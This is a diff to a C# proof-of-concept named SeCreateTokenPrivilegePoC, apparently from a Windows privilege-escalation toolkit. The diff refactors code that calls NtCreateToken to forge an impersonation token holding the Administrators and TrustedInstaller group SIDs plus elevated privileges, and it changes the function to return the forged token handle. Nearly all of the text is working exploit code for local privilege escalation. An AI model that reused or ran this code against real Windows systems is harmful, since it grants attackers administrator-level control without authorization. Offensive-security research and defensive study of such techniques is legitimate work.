@@ -78,6 +78,20 @@ namespace SeCreateTokenPrivilegePoC
             [FieldOffset(0)]
             public long QuadPart;
 
+            public LARGE_INTEGER(int _low, int _high)
+            {
+                QuadPart = 0L;
+                Low = _low;
+                High = _high;
+            }
+
+            public LARGE_INTEGER(long _quad)
+            {
+                Low = 0;
+                High = 0;
+                QuadPart = _quad;
+            }
+
             public long ToInt64()
             {
                 return ((long)this.High << 32) | (uint)this.Low;
@@ -167,10 +181,10 @@ namespace SeCreateTokenPrivilegePoC
         [StructLayout(LayoutKind.Sequential)]
         struct SECURITY_QUALITY_OF_SERVICE
         {
-            int Length;
-            SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
-            byte ContextTrackingMode;
-            byte EffectiveOnly;
+            readonly int Length;
+            readonly SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
+            readonly byte ContextTrackingMode;
+            readonly byte EffectiveOnly;
 
             public SECURITY_QUALITY_OF_SERVICE(
                 SECURITY_IMPERSONATION_LEVEL _impersonationLevel,
@@ -445,7 +459,7 @@ namespace SeCreateTokenPrivilegePoC
             }
         }
 
-        static bool CreatePrivilegedToken()
+        static IntPtr CreatePrivilegedToken()
         {
             LUID authId;
             int MajorVersion = 0;
@@ -468,7 +482,7 @@ namespace SeCreateTokenPrivilegePoC
             Console.WriteLine("[>] Trying to create a elevated token.");
 
             if (!GetCurrentUserSid(out IntPtr pSid))
-                return false;
+                return IntPtr.Zero;
 
             TOKEN_USER tokenUser = new TOKEN_USER();
             tokenUser.User.Attributes = 0;
@@ -478,7 +492,7 @@ namespace SeCreateTokenPrivilegePoC
             {
                 Console.WriteLine("[-] Failed to allocate LUID.");
                 Console.WriteLine("    -> {0}", GetWin32ErrorMessage(Marshal.GetLastWin32Error()));
-                return false;
+                return IntPtr.Zero;
             }
 
             TOKEN_SOURCE tokenSource = new TOKEN_SOURCE("PrivFu!!");
@@ -486,13 +500,13 @@ namespace SeCreateTokenPrivilegePoC
             tokenSource.SourceIdentifier.HighPart = luid.HighPart;
 
             if (!GetElevatedPrivileges(out TOKEN_PRIVILEGES tokenPrivileges))
-                return false;
+                return IntPtr.Zero;
 
             if (!ConvertStringSidToSidA(DOMAIN_ALIAS_RID_ADMINS, out IntPtr pAdminGroup))
             {
                 Console.WriteLine("[-] Failed to get Administrator group SID.");
                 Console.WriteLine("    -> {0}", GetWin32ErrorMessage(Marshal.GetLastWin32Error()));
-                return false;
+                return IntPtr.Zero;
             }
 
             if (!ConvertStringSidToSidA(
@@ -501,7 +515,7 @@ namespace SeCreateTokenPrivilegePoC
             {
                 Console.WriteLine("[-] Failed to get Trusted Installer SID.");
                 Console.WriteLine("    -> {0}", GetWin32ErrorMessage(Marshal.GetLastWin32Error()));
-                return false;
+                return IntPtr.Zero;
             }
 
             IntPtr hCurrentToken = WindowsIdentity.GetCurrent().Token;
@@ -520,7 +534,7 @@ namespace SeCreateTokenPrivilegePoC
                 pTokenDefaultDacl == IntPtr.Zero)
             {
                 Console.WriteLine("[-] Failed to get current token information.");
-                return false;
+                return IntPtr.Zero;
             }
 
             TOKEN_GROUPS tokenGroups = (TOKEN_GROUPS)Marshal.PtrToStructure(
@@ -565,9 +579,7 @@ namespace SeCreateTokenPrivilegePoC
             }
 
             TOKEN_OWNER tokenOwner = new TOKEN_OWNER(pSid);
-            LARGE_INTEGER expirationTime = new LARGE_INTEGER();
-            expirationTime.Low = -1;
-            expirationTime.High = -1;
+            LARGE_INTEGER expirationTime = new LARGE_INTEGER(-1L);
 
             SECURITY_QUALITY_OF_SERVICE sqos = new SECURITY_QUALITY_OF_SERVICE(
                 SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, 0, 0);
@@ -577,7 +589,7 @@ namespace SeCreateTokenPrivilegePoC
             oa.SecurityQualityOfService = pSqos;
 
             int ntstatus = NtCreateToken(
-                out IntPtr TokenHandle,
+                out IntPtr hToken,
                 TOKEN_ALL_ACCESS,
                 ref oa,
                 TOKEN_TYPE.TokenImpersonation,
@@ -595,16 +607,10 @@ namespace SeCreateTokenPrivilegePoC
             {
                 Console.WriteLine("[-] Failed to create privileged token.");
                 Console.WriteLine("    |-> {0}", GetWin32ErrorMessage(ntstatus));
-                return false;
+                return IntPtr.Zero;
             }
 
-            Console.WriteLine("[+] Got handle to the elevated token (hFile = 0x{0}).", TokenHandle.ToString("X"));
-            Console.WriteLine("\n[*] To close the handle and exit this program, hit [ENTER] key.");
-            Console.ReadLine();
-
-            CloseHandle(TokenHandle);
-
-            return true;
+            return hToken;
         }
 
         static bool GetElevatedPrivileges(out TOKEN_PRIVILEGES tokenPrivileges)
@@ -730,7 +736,16 @@ namespace SeCreateTokenPrivilegePoC
 
         static void Main()
         {
-            CreatePrivilegedToken();
+            IntPtr hToken = CreatePrivilegedToken();
+
+            if (hToken != IntPtr.Zero)
+            {
+                Console.WriteLine("[+] Got handle to the elevated token (hFile = 0x{0}).", hToken.ToString("X"));
+                Console.WriteLine("\n[*] To close the handle and exit this program, hit [ENTER] key.");
+                Console.ReadLine();
+
+                CloseHandle(hToken);
+            }
         }
     }
 }
